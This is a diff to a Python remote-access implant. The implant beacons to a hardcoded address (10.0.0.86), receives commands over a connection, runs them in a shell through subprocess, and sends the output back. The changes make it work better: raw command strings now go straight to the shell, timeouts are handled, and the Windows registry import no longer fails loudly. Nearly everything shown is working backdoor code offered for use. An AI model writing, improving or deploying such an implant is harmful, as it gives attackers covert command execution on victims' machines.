@@ -5,14 +5,12 @@ import importlib
 from time import time, sleep
 from os import remove, path, getpid, kill, getlogin, name
 from datetime import datetime
-from sys import exit
+from sys import exit,exc_info
 from signal import SIGTERM
 from random import randint, uniform, choice
 
-if name  == "nt":
-    winreg_exists = importlib.util.find_spec('winreg')
-    if winreg_exists:
-        import winreg
+
+    
 
 UUID = "c60a59df-c3e1-11ea-a17a-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
 remote_ip = '10.0.0.86'
@@ -24,6 +22,16 @@ BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = None
 BEACON_INTERVAL_HDD = None
 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
+
+
+try:
+    if name  == "nt":
+        winreg_exists = importlib.util.find_spec('winreg')
+        if winreg_exists:
+            import winreg
+except:
+    if VERBOSE:
+        print_warn(exc_info())
 
 def create_keys():
     server_cert ='''\
@@ -294,13 +302,15 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 
             else:
                 try:
-                    output = subprocess.run(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+                    output = subprocess.run(data, timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                     if output.stderr != b"":
                         send_data(conn, output.stderr.decode('utf-8')) # send back the errors
                     elif output.stdout == b"":
                         send_data(conn, "ERROR --> {}".format(data))
                     else:
                         send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                except subprocess.TimeoutExpired:
+                    send_data(conn, "Timeout Expired!")
                 except Exception as e:
                     if VERBOSE:
                         print_fail("Exception! --> {}".format(e))
